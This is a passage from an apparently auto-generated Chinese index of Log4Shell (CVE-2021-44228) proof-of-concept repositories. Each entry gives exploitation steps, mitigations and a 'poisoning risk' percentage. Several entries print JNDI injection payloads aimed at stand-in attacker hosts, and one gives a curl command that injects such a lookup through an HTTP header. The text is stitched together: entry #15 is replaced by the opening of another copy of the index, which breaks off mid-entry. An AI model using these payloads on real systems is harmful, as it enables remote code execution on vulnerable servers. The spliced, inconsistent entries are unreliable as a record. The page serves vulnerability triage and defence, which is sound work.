*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

